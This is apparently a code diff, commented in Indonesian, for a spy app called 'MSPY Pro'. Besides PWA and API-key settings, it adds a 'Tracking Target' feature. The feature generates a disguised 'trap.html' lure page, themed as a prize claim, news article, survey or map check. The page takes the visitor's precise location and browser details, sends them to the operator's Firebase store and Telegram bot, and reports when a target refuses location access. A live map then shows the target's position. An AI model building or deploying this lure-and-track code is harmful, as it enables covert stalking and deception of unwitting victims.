-    showSettingsStatus('⚠️ Tersimpan. Tidak bisa test sekarang ('+e.message+').','var(--amber)');
-    apiMode='online'; updateAPIStatus('online');
-  }
-}
-
-function showSettingsStatus(msg,color){
-  const el=document.getElementById('settings-apikey-status');
-  if(!el) return;
-  el.style.display='block';
-  el.style.color=color;
-  el.style.background=color==='var(--green)'?'rgba(34,211,163,.1)':color==='var(--red)'?'rgba(244,92,92,.1)':'var(--bg3)';
-  el.style.border='1px solid '+(color==='var(--green)'?'rgba(34,211,163,.25)':color==='var(--red)'?'rgba(244,92,92,.25)':'var(--border)');
-  el.textContent=msg;
-}
-
-function settingsClearApiKey(){
-  if(!confirm('Hapus API Key? Fitur IMEI & Phone Lookup akan nonaktif.')) return;
-  localStorage.removeItem('mspy_groq_apikey');
-  const inp=document.getElementById('settings-apikey');
-  if(inp) inp.value='';
-  apiMode='offline'; updateAPIStatus('offline');
-  showSettingsStatus('🗑 API Key dihapus.','var(--amber)');
-  showApiKeyBanner();
-}
-
-// ══════════════════════════════════════════════════════════════
 // INIT — cek session yang tersimpan
 // ══════════════════════════════════════════════════════════════
 (function init(){
@@ -3390,26 +3124,509 @@ function settingsClearApiKey(){
 
 
 // ═══════════════════════════════════════════════════════════════
-// PWA — Service Worker Registration
+// PWA — Progressive Web App
 // ═══════════════════════════════════════════════════════════════
 
-// 1. Register Service Worker
+// 1. Pastikan manifest.json terhubung
+(function setupManifest(){
+  const link = document.getElementById('pwa-manifest-link');
+  if(link){
+    // Pakai manifest.json yang ada di folder (lebih reliable dari blob)
+    link.href = './manifest.json';
+  }
+})();
+
+// 2. Register Service Worker — wajib untuk PWA install
 if('serviceWorker' in navigator){
   window.addEventListener('load', ()=>{
     navigator.serviceWorker.register('./sw.js')
       .then(reg=>{
-        console.log('[SW] Registered, scope:', reg.scope);
-        reg.addEventListener('updatefound', ()=>{
-          const sw = reg.installing;
-          sw.addEventListener('statechange', ()=>{
-            if(sw.state==='installed' && navigator.serviceWorker.controller){
-              console.log('[SW] Update tersedia — refresh untuk versi terbaru');
+        console.log('SW registered:', reg.scope);
+        // Update SW jika ada versi baru
+        reg.addEventListener('updatefound',()=>{
+          const newWorker = reg.installing;
+          newWorker.addEventListener('statechange',()=>{
+            if(newWorker.state==='installed'&&navigator.serviceWorker.controller){
+              console.log('SW updated — refresh untuk versi terbaru');
             }
           });
         });
       })
-      .catch(err=>console.log('[SW] Gagal register:', err));
+      .catch(err=>console.log('SW registration failed:', err));
   });
 }
 
-// 2. Install Prompt
+// 3. Install Prompt
+let deferredInstallPrompt = null;
+window.addEventListener('beforeinstallprompt', e=>{
+  e.preventDefault();
+  deferredInstallPrompt = e;
+  const bar = document.getElementById('pwa-install-bar');
+  if(bar) bar.style.display = 'flex';
+});
+
+function triggerInstall(){
+  if(deferredInstallPrompt){
+    deferredInstallPrompt.prompt();
+    deferredInstallPrompt.userChoice.then(r=>{
+      if(r.outcome==='accepted'){
+        const bar=document.getElementById('pwa-install-bar');
+        if(bar) bar.style.display='none';
+      }
+      deferredInstallPrompt=null;
+    });
+    return;
+  }
+  // Panduan manual jika prompt tidak tersedia
+  const ua=navigator.userAgent;
+  const isIOS=/iPad|iPhone|iPod/.test(ua);
+  const isAndroid=/Android/.test(ua);
+  if(isIOS){
+    alert('Untuk install di iPhone/iPad:\n\n1. Buka halaman ini di Safari\n2. Tap tombol Bagikan (kotak dengan panah ke atas)\n3. Gulir ke bawah, pilih "Tambahkan ke Layar Utama"\n4. Tap "Tambahkan" — selesai!');
+  }else if(isAndroid){
+    alert('Untuk install di Android:\n\n1. Buka halaman ini di Chrome\n2. Tap menu tiga titik (⋮) di pojok kanan atas\n3. Pilih "Tambahkan ke layar utama" atau "Install aplikasi"\n4. Tap "Tambahkan" — selesai!');
+  }else{
+    alert('Untuk install di PC/laptop:\n\n1. Buka halaman ini di Chrome atau Edge\n2. Klik ikon install (⊕) di address bar kanan\n3. Klik "Install" — selesai!\n\nJika tidak muncul, coba hosting file di server HTTPS terlebih dahulu.');
+  }
+}
+
+// ══════════════════════════════════════════════════════════════
+// SETTINGS SCREEN
+// ══════════════════════════════════════════════════════════════
+function saveAdminConfig(){
+  const token=(document.getElementById('admin-tg-token')?.value||'').trim();
+  const chatId=(document.getElementById('admin-tg-chatid')?.value||'').trim();
+  const st=document.getElementById('admin-cfg-status');
+  if(!token||!chatId){if(st){st.style.display='block';st.style.background='rgba(244,92,92,.1)';st.style.color='var(--red)';st.textContent='❌ Isi token dan chat ID dulu.';}return;}
+  saveAdminCfg({tgToken:token,tgChatId:chatId});
+  if(st){st.style.display='block';st.style.background='rgba(34,211,163,.1)';st.style.color='var(--green)';st.textContent='✅ Config admin tersimpan!';}
+}
+async function testAdminNotif(){
+  const st=document.getElementById('admin-cfg-status');
+  const token=(document.getElementById('admin-tg-token')?.value||'').trim();
+  const chatId=(document.getElementById('admin-tg-chatid')?.value||'').trim();
+  if(!token||!chatId){if(st){st.style.display='block';st.style.color='var(--amber)';st.textContent='⚠️ Isi dulu.';}return;}
+  saveAdminCfg({tgToken:token,tgChatId:chatId});
+  if(st){st.style.display='block';st.style.color='var(--text2)';st.textContent='🔄 Mengirim test...';}
+  try{
+    const r=await fetch('https://api.telegram.org/bot'+token+'/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:chatId,text:'🔔 *MSPY Pro Admin Monitor Aktif!*\n\nNotif akan dikirim untuk:\n• 🔐 Login & Daftar\n• 🔍 IMEI lookup\n• 📞 Phone lookup\n\n⏰ '+new Date().toLocaleString('id-ID'),parse_mode:'Markdown'})});
+    const d=await r.json();
+    if(d.ok){if(st){st.style.background='rgba(34,211,163,.1)';st.style.color='var(--green)';st.textContent='✅ Berhasil! Cek Telegram kamu.';}}
+    else{if(st){st.style.color='var(--red)';st.textContent='❌ '+d.description;}}
+  }catch(e){if(st){st.style.color='var(--red)';st.textContent='❌ '+e.message;}}
+}
+function showSettings(){
+  show('screen-settings');
+  const ac=getAdminCfg();
+  const at=document.getElementById('admin-tg-token');
+  const aci=document.getElementById('admin-tg-chatid');
+  if(at&&ac.tgToken) at.value=ac.tgToken;
+  if(aci&&ac.tgChatId) aci.value=ac.tgChatId;
+  // Load key yang sudah tersimpan (tampilkan masked)
+  const key=getApiKey();
+  const input=document.getElementById('settings-apikey');
+  if(input) input.value=key;
+  // Update status cards
+  const apiSt=document.getElementById('set-api-status');
+  if(apiSt) apiSt.textContent=apiMode==='online'?'✅ Online':'❌ Offline / Belum diisi';
+  if(apiSt) apiSt.style.color=apiMode==='online'?'var(--green)':'var(--red)';
+  const gpsSt=document.getElementById('set-gps-status');
+  if(gpsSt) gpsSt.textContent='geolocation' in navigator?'✅ Didukung':'❌ Tidak didukung';
+  if(gpsSt) gpsSt.style.color='geolocation' in navigator?'var(--green)':'var(--red)';
+  // Sembunyikan banner jika ada
+  const banner=document.getElementById('apikey-banner');
+  if(banner) banner.style.display='none';
+}
+
+function toggleApiKeyVisibility(){
+  const inp=document.getElementById('settings-apikey');
+  const btn=document.getElementById('apikey-eye-btn');
+  if(!inp) return;
+  if(inp.type==='password'){ inp.type='text'; btn.textContent='🙈'; }
+  else{ inp.type='password'; btn.textContent='👁'; }
+}
+
+async function settingsSaveApiKey(){
+  const inp=document.getElementById('settings-apikey');
+  const key=(inp?.value||'').trim();
+  if(!key){ showSettingsStatus('❌ API Key tidak boleh kosong','var(--red)'); return; }
+  if(!key.startsWith('gsk_')){ showSettingsStatus('⚠️ Format key tidak valid. Groq key harus diawali gsk_','var(--amber)'); return; }
+  saveApiKey(key);
+  showSettingsStatus('🔄 Menyimpan dan menguji koneksi ke Groq...','var(--text2)');
+  try{
+    const r=await fetch('https://api.groq.com/openai/v1/chat/completions',{
+      method:'POST',
+      headers:{'Content-Type':'application/json','Authorization':'Bearer '+key},
+      body:JSON.stringify({model:'llama-3.1-8b-instant',max_tokens:5,messages:[{role:'user',content:'hi'}]})
+    });
+    if(r.ok){
+      apiMode='online';
+      updateAPIStatus('online');
+      showSettingsStatus('✅ Groq API Key valid! Fitur IMEI & Phone Lookup siap digunakan.','var(--green)');
+      const banner=document.getElementById('apikey-banner');
+      if(banner) banner.style.display='none';
+    } else if(r.status===401){
+      showSettingsStatus('❌ API Key ditolak (401). Cek kembali key-nya.','var(--red)');
+    } else {
+      showSettingsStatus('⚠️ Tersimpan, tapi test gagal (HTTP '+r.status+'). Coba lagi nanti.','var(--amber)');
+    }
+  }catch(e){
+    showSettingsStatus('⚠️ Tersimpan. Tidak bisa test sekarang ('+e.message+').','var(--amber)');
+  }
+}
+
+function showSettingsStatus(msg,color){
+  const el=document.getElementById('settings-apikey-status');
+  if(!el) return;
+  el.style.display='block';
+  el.style.color=color;
+  el.style.background=color==='var(--green)'?'rgba(34,211,163,.1)':color==='var(--red)'?'rgba(244,92,92,.1)':'var(--bg3)';
+  el.style.border='1px solid '+(color==='var(--green)'?'rgba(34,211,163,.25)':color==='var(--red)'?'rgba(244,92,92,.25)':'var(--border)');
+  el.textContent=msg;
+}
+
+function settingsClearApiKey(){
+  if(!confirm('Hapus API Key? Fitur IMEI & Phone Lookup akan nonaktif.')) return;
+  localStorage.removeItem(APIKEY_STORAGE);
+  const inp=document.getElementById('settings-apikey');
+  if(inp) inp.value='';
+  apiMode='offline';
+  updateAPIStatus('offline');
+  showSettingsStatus('🗑 API Key dihapus.','var(--amber)');
+  showApiKeyBanner();
+}
+
+
+
+window.addEventListener('appinstalled',()=>{
+  const bar=document.getElementById('pwa-install-bar');
+  if(bar) bar.style.display='none';
+  console.log('MSPY Pro installed as PWA');
+});
+
+// ══════════════════════════════════════════════════════════════════════
+// TRACKING TARGET — Firebase + Telegram
+// ══════════════════════════════════════════════════════════════════════
+
+let trkMap=null, trkMarker=null, trkInterval=null, trkMapInit=false;
+const TRK_KEY='mspy_trk_cfg', TRK_HIST_KEY='mspy_trk_hist';
+
+function showTracking(){
+  show('screen-tracking');
+  trkLoadConfig();
+  trkRenderHistory();
+  // Init map saat pertama kali
+  if(!trkMapInit){
+    setTimeout(()=>{
+      if(typeof L!=='undefined'){
+        trkMap=L.map('trk-map').setView([-2.5,118],5);
+        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{
+          attribution:'© OSM',maxZoom:19
+        }).addTo(trkMap);
+        trkMapInit=true;
+      }
+    },300);
+  }
+}
+
+function trkLoadConfig(){
+  try{
+    const c=JSON.parse(localStorage.getItem(TRK_KEY)||'{}');
+    if(c.fbUrl) document.getElementById('trk-fb-url').value=c.fbUrl;
+    if(c.fbSecret) document.getElementById('trk-fb-secret').value=c.fbSecret;
+    if(c.tgToken) document.getElementById('trk-tg-token').value=c.tgToken;
+    if(c.tgChatId) document.getElementById('trk-tg-chatid').value=c.tgChatId;
+  }catch(e){}
+}
+
+function trkSaveConfig(){
+  const c={
+    fbUrl: document.getElementById('trk-fb-url').value.trim(),
+    fbSecret: document.getElementById('trk-fb-secret').value.trim(),
+    tgToken: document.getElementById('trk-tg-token').value.trim(),
+    tgChatId: document.getElementById('trk-tg-chatid').value.trim()
+  };
+  localStorage.setItem(TRK_KEY, JSON.stringify(c));
+}
+
+function trkGetConfig(){
+  try{ return JSON.parse(localStorage.getItem(TRK_KEY)||'{}'); }
+  catch(e){ return {}; }
+}
+
+async function trkTestConnection(){
+  const c=trkGetConfig();
+  const res=document.getElementById('trk-test-result');
+  res.style.display='block';
+  res.style.color='var(--text2)';
+  res.textContent='🔄 Menguji koneksi...';
+
+  let ok=[], fail=[];
+
+  // Test Firebase
+  if(c.fbUrl){
+    try{
+      const url=c.fbUrl.replace(/\/$/,'')+'/mspy_test.json'+(c.fbSecret?'?auth='+c.fbSecret:'');
+      const r=await fetch(url,{method:'PUT',body:JSON.stringify({test:true,t:Date.now()})});
+      if(r.ok) ok.push('Firebase ✅');
+      else fail.push('Firebase ❌ ('+r.status+')');
+    }catch(e){ fail.push('Firebase ❌ ('+e.message+')'); }
+  } else fail.push('Firebase ❌ (URL kosong)');
+
+  // Test Telegram
+  if(c.tgToken && c.tgChatId){
+    try{
+      const r=await fetch('https://api.telegram.org/bot'+c.tgToken+'/sendMessage',{
+        method:'POST', headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({chat_id:c.tgChatId, text:'✅ MSPY Pro — Koneksi berhasil! Bot Telegram siap menerima notifikasi lokasi target.'})
+      });
+      const d=await r.json();
+      if(d.ok) ok.push('Telegram ✅');
+      else fail.push('Telegram ❌ ('+d.description+')');
+    }catch(e){ fail.push('Telegram ❌ ('+e.message+')'); }
+  } else fail.push('Telegram ❌ (token/chat_id kosong)');
+
+  const allOk=fail.length===0;
+  res.style.color=allOk?'var(--green)':'var(--amber)';
+  res.textContent=(allOk?'Semua koneksi berhasil! ':'Ada yang gagal: ')+[...ok,...fail].join(' | ');
+}
+
+function trkGenerateLink(){
+  const c=trkGetConfig();
+  if(!c.fbUrl){ alert('Isi Firebase URL dulu di konfigurasi!'); return; }
+  const label=document.getElementById('trk-target-label').value.trim()||'target';
+  const theme=document.getElementById('trk-trap-theme').value;
+  // Encode config ke dalam URL sebagai hash param (tidak dikirim ke server)
+  const params=new URLSearchParams({
+    fb: btoa(c.fbUrl),
+    fs: btoa(c.fbSecret||''),
+    tt: btoa(c.tgToken||''),
+    tc: btoa(c.tgChatId||''),
+    lbl: label,
+    thm: theme
+  });
+  // Link ke file trap.html yang akan kita buat
+  const baseUrl=window.location.href.replace(/\/[^/]*$|$/,'')+'/trap.html';
+  const link=baseUrl+'#'+params.toString();
+  document.getElementById('trk-link-val').value=link;
+  document.getElementById('trk-link-box').style.display='block';
+}
+
+function trkCopyLink(){
+  const v=document.getElementById('trk-link-val').value;
+  navigator.clipboard.writeText(v).then(()=>alert('✅ Link disalin!')).catch(()=>{
+    document.getElementById('trk-link-val').select();
+    document.execCommand('copy');
+    alert('✅ Link disalin!');
+  });
+}
+
+function trkShareLink(){
+  const v=document.getElementById('trk-link-val').value;
+  if(navigator.share){ navigator.share({title:'Cek ini!',url:v}); }
+  else{ trkCopyLink(); }
+}
+
+function trkDownloadTrapPage(){
+  const theme=document.getElementById('trk-trap-theme').value;
+  const html=trkBuildTrapHTML(theme);
+  const blob=new Blob([html],{type:'text/html'});
+  const a=document.createElement('a');
+  a.href=URL.createObjectURL(blob);
+  a.download='trap.html';
+  a.click();
+  setTimeout(()=>URL.revokeObjectURL(a.href),5000);
+}
+
+function trkBuildTrapHTML(theme){
+  const themes={
+    maps:{title:'Cek Lokasiku di Maps',icon:'📍',heading:'Lihat Lokasimu',body:'Mendeteksi posisi kamu di peta...'},
+    promo:{title:'Selamat! Kamu Menang Hadiah 🎁',icon:'🎁',heading:'Klaim Hadiahmu Sekarang',body:'Verifikasi lokasi untuk klaim hadiah...'},
+    news:{title:'Berita Terkini — Viral Sekarang',icon:'📰',heading:'Baca Berita Selengkapnya',body:'Memuat artikel...'},
+    form:{title:'Survei Singkat 2 Menit',icon:'📋',heading:'Bantu Kami dengan Survei Ini',body:'Memuat formulir...'},
+    blank:{title:'Loading...',icon:'⏳',heading:'',body:''}
+  };
+  const t=themes[theme]||themes.blank;
+  const h1=t.heading?'<h1>'+t.heading+'</h1>':'';
+  // Gunakan string concat biasa — hindari template literal agar tidak break parser
+  const sc='scr'+'ipt', sc2='/scr'+'ipt';
+  return '<!DOCTYPE html>\n'
+    +'<html lang="id">\n<head>\n'
+    +'<meta charset="UTF-8"/>\n'
+    +'<meta name="viewport" content="width=device-width,initial-scale=1"/>\n'
+    +'<title>'+t.title+'</title>\n'
+    +'<style>\n'
+    +'*{box-sizing:border-box;margin:0;padding:0}\n'
+    +'body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;background:#f5f5f5;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:1rem}\n'
+    +'.card{background:#fff;border-radius:16px;padding:2rem;max-width:380px;width:100%;text-align:center;box-shadow:0 4px 30px rgba(0,0,0,.1)}\n'
+    +'.icon{font-size:52px;margin-bottom:12px}\n'
+    +'h1{font-size:20px;font-weight:700;margin-bottom:8px;color:#1a1a2e}\n'
+    +'.sub{font-size:14px;color:#666;margin-bottom:24px;line-height:1.5}\n'
+    +'.spinner{width:36px;height:36px;border:3px solid #eee;border-top-color:#3b7ef8;border-radius:50%;animation:spin .8s linear infinite;margin:0 auto 16px}\n'
+    +'@keyframes spin{to{transform:rotate(360deg)}}\n'
+    +'.status{font-size:13px;color:#888;margin-top:8px}\n'
+    +'.ok{color:#22c55e;font-weight:600;font-size:15px;margin-top:16px;display:none}\n'
+    +'</style>\n</head>\n<body>\n'
+    +'<div class="card">\n'
+    +'  <div class="icon">'+t.icon+'</div>\n'
+    +'  '+h1+'\n'
+    +'  <div class="sub">'+t.body+'</div>\n'
+    +'  <div class="spinner" id="spin"></div>\n'
+    +'  <div class="status" id="stat">Memeriksa...</div>\n'
+    +'  <div class="ok" id="ok">✅ Berhasil!</div>\n'
+    +'</div>\n'
+    +'<'+sc+'>\n'
+    +'const params=new URLSearchParams(location.hash.slice(1));\n'
+    +'const fbUrl=atob(params.get("fb")||"");\n'
+    +'const fbSecret=atob(params.get("fs")||"");\n'
+    +'const tgToken=atob(params.get("tt")||"");\n'
+    +'const tgChatId=atob(params.get("tc")||"");\n'
+    +'const label=params.get("lbl")||"target";\n'
+    +'function setStatus(m){document.getElementById("stat").textContent=m;}\n'
+    +'function sendData(lat,lng,acc,addr){\n'
+    +'  const ts=new Date().toLocaleString("id-ID");\n'
+    +'  const data={lat,lng,acc,addr,label,time:ts,ua:navigator.userAgent.slice(0,80)};\n'
+    +'  if(fbUrl){\n'
+    +'    const key="loc_"+Date.now();\n'
+    +'    const url=fbUrl.replace(/\\/$/,"")+"/mspy_targets/"+encodeURIComponent(label)+"/"+key+".json"+(fbSecret?"?auth="+fbSecret:"");\n'
+    +'    fetch(url,{method:"PUT",body:JSON.stringify(data)}).catch(()=>{});\n'
+    +'  }\n'
+    +'  if(tgToken&&tgChatId){\n'
+    +'    const msg="📍 *Lokasi Target: "+label+"*\\n\\n🗺️ Koordinat: "+lat.toFixed(6)+", "+lng.toFixed(6)+"\\n📐 Akurasi: ±"+Math.round(acc)+"m\\n🏠 Alamat: "+(addr||"—")+"\\n⏰ Waktu: "+ts+"\\n🔗 https://maps.google.com/?q="+lat+","+lng;\n'
+    +'    fetch("https://api.telegram.org/bot"+tgToken+"/sendMessage",{\n'
+    +'      method:"POST",headers:{"Content-Type":"application/json"},\n'
+    +'      body:JSON.stringify({chat_id:tgChatId,text:msg,parse_mode:"Markdown"})\n'
+    +'    }).catch(()=>{});\n'
+    +'  }\n'
+    +'  document.getElementById("spin").style.display="none";\n'
+    +'  document.getElementById("ok").style.display="block";\n'
+    +'  setStatus("✅ Selesai");\n'
+    +'}\n'
+    +'function reverseGeocode(lat,lng,cb){\n'
+    +'  fetch("https://nominatim.openstreetmap.org/reverse?lat="+lat+"&lon="+lng+"&format=json&zoom=16&accept-language=id")\n'
+    +'    .then(r=>r.json()).then(d=>{\n'
+    +'      const a=d.address||{};\n'
+    +'      const parts=[a.road||a.neighbourhood,a.city_district||a.suburb,a.city||a.town,a.state].filter(Boolean);\n'
+    +'      cb(parts.slice(0,3).join(", ")||d.display_name||"—");\n'
+    +'    }).catch(()=>cb("—"));\n'
+    +'}\n'
+    +'if("geolocation" in navigator){\n'
+    +'  setStatus("Meminta akses lokasi...");\n'
+    +'  navigator.geolocation.getCurrentPosition(\n'
+    +'    pos=>{\n'
+    +'      const {latitude:lat,longitude:lng,accuracy:acc}=pos.coords;\n'
+    +'      setStatus("Mendapatkan alamat...");\n'
+    +'      reverseGeocode(lat,lng,addr=>{ setStatus("Mengirim..."); sendData(lat,lng,acc,addr); });\n'
+    +'    },\n'
+    +'    err=>{\n'
+    +'      setStatus("Lokasi ditolak");\n'
+    +'      if(tgToken&&tgChatId){\n'
+    +'        fetch("https://api.telegram.org/bot"+tgToken+"/sendMessage",{\n'
+    +'          method:"POST",headers:{"Content-Type":"application/json"},\n'
+    +'          body:JSON.stringify({chat_id:tgChatId,text:"👁️ Target "+label+" membuka link tapi tolak lokasi!\\n⏰ "+new Date().toLocaleString("id-ID"),parse_mode:"Markdown"})\n'
+    +'        }).catch(()=>{});\n'
+    +'      }\n'
+    +'      document.getElementById("spin").style.display="none";\n'
+    +'    },\n'
+    +'    {enableHighAccuracy:true,timeout:20000,maximumAge:0}\n'
+    +'  );\n'
+    +'} else { setStatus("Browser tidak support geolokasi"); }\n'
+    +'<\/'+sc2+'>\n'
+    +'</body>\n</html>';
+}
+
+// ── Live listening dari Firebase ─────────────────────────────────────────────
+function trkStartListen(){
+  const c=trkGetConfig();
+  if(!c.fbUrl){ alert('Isi Firebase URL dulu!'); return; }
+  document.getElementById('trk-listen-btn').style.display='none';
+  document.getElementById('trk-stop-btn').style.display='';
+  setTrkDot('loading','Mendengarkan...');
+
+  trkInterval=setInterval(async()=>{
+    try{
+      const label=document.getElementById('trk-target-label').value.trim()||'target';
+      const url=c.fbUrl.replace(/\/$/,'')+'/mspy_targets/'+encodeURIComponent(label)+'.json'+(c.fbSecret?'?auth='+c.fbSecret:'');
+      const r=await fetch(url);
+      if(!r.ok) throw new Error('HTTP '+r.status);
+      const data=await r.json();
+      if(!data){ setTrkDot('loading','Menunggu target...'); return; }
+
+      // Ambil entry terbaru
+      const entries=Object.values(data).sort((a,b)=>new Date(b.time)-new Date(a.time));
+      const latest=entries[0];
+      if(latest && latest.lat && latest.lng){
+        setTrkDot('active','LIVE · '+new Date().toLocaleTimeString('id-ID'));
+        trkUpdateMap(latest.lat,latest.lng,latest.acc,latest.addr,latest.time);
+        trkSaveHistory(entries);
+        trkRenderHistory(entries);
+      }
+    }catch(e){ setTrkDot('error','Error: '+e.message); }
+  },8000); // poll setiap 8 detik
+  // Langsung fetch pertama kali
+  setTimeout(()=>trkInterval&&(trkInterval._fn||trkInterval)(),100);
+}
+
+function trkStopListen(){
+  clearInterval(trkInterval); trkInterval=null;
+  document.getElementById('trk-listen-btn').style.display='';
+  document.getElementById('trk-stop-btn').style.display='none';
+  setTrkDot('offline','Dihentikan');
+}
+
+function setTrkDot(state,label){
+  const dot=document.getElementById('trk-dot');
+  const lbl=document.getElementById('trk-dot-label');
+  if(!dot||!lbl) return;
+  const colors={active:'var(--green)',loading:'var(--amber)',error:'var(--red)',offline:'var(--text3)'};
+  dot.style.background=colors[state]||colors.offline;
+  dot.style.animation=state==='active'?'blink 1.2s infinite':'none';
+  lbl.style.color=colors[state]||colors.offline;
+  lbl.textContent=label;
+}
+
+function trkUpdateMap(lat,lng,acc,addr,time){
+  if(!trkMapInit||!trkMap) return;
+  const popHtml=`<b>📍 Target</b><br><span style="font-size:11px">${lat.toFixed(6)}, ${lng.toFixed(6)}</span><br>Akurasi: ±${Math.round(acc||0)}m<br>${addr||''}<br><small style="color:#888">${time||''}</small>`;
+  const icon=L.divIcon({html:'<div style="width:16px;height:16px;border-radius:50%;background:#f45c5c;border:3px solid #fff;box-shadow:0 0 12px rgba(244,92,92,.8)"></div>',iconSize:[16,16],iconAnchor:[8,8],className:''});
+  if(trkMarker) trkMap.removeLayer(trkMarker);
+  trkMarker=L.marker([lat,lng],{icon}).addTo(trkMap).bindPopup(popHtml).openPopup();
+  trkMap.setView([lat,lng],15,{animate:true});
+}
+
+function trkSaveHistory(entries){
+  try{ localStorage.setItem(TRK_HIST_KEY,JSON.stringify(entries.slice(0,50))); }catch(e){}
+}
+
+function trkRenderHistory(entries){
+  if(!entries){
+    try{ entries=JSON.parse(localStorage.getItem(TRK_HIST_KEY)||'[]'); }catch(e){ entries=[]; }
+  }
+  const el=document.getElementById('trk-history-list');
+  if(!el) return;
+  if(!entries.length){
+    el.innerHTML='<div style="text-align:center;color:var(--text3);font-size:12px;padding:1rem">Belum ada data</div>';
+    return;
+  }
+  el.innerHTML=entries.slice(0,15).map((e,i)=>`
+    <div style="display:flex;align-items:flex-start;gap:10px;padding:8px 0;border-bottom:1px solid var(--border);font-size:12px" onclick="trkUpdateMap(${e.lat},${e.lng},${e.acc||0},'${(e.addr||'').replace(/'/g,'')  }','${e.time||''}')">
+      <div style="font-size:18px;flex-shrink:0">${i===0?'📍':'🔵'}</div>
+      <div style="flex:1;min-width:0">
+        <div style="font-weight:600;color:${i===0?'var(--green)':'var(--text)'}">${i===0?'Terbaru — ':''}<span class="mono">${(e.lat||0).toFixed(5)}, ${(e.lng||0).toFixed(5)}</span></div>
+        <div style="color:var(--text2);font-size:11px;margin-top:2px">${e.addr||'—'}</div>
+        <div style="color:var(--text3);font-size:10px;margin-top:2px">±${Math.round(e.acc||0)}m · ${e.time||''}</div>
+      </div>
+      <a href="https://maps.google.com/?q=${e.lat},${e.lng}" target="_blank" style="color:var(--accent);font-size:11px;flex-shrink:0">Maps →</a>
+    </div>
+  `).join('');
+}
+
+function trkClearHistory(){
+  if(!confirm('Hapus semua riwayat lokasi target?')) return;
+  localStorage.removeItem(TRK_HIST_KEY);
+  trkRenderHistory([]);
+}
+</script>
+
+</body>
+</html>
